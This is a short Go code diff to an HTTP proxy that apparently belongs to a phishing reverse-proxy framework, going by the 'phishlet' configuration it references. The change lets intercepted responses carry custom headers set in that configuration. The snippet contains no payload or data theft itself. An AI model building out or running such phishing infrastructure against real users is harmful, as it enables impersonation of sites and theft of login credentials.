@@ -905,7 +905,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
 							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
 							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
-								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime, ic.headers)
 							}
 						}
 					}
@@ -1380,7 +1380,7 @@ func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Respon
 	return req, nil
 }
 
-func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
+func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string, headers map[string]string) (*http.Request, *http.Response) {
 	if mime == "" {
 		mime = "text/plain"
 	}
@@ -1389,6 +1389,10 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 		origin := req.Header.Get("Origin")
 		if origin != "" {
 			resp.Header.Set("Access-Control-Allow-Origin", origin)
+		}
+		// Apply custom headers from phishlet configuration
+		for headerKey, headerValue := range headers {
+			resp.Header.Set(headerKey, headerValue)
 		}
 		return req, resp
 	}
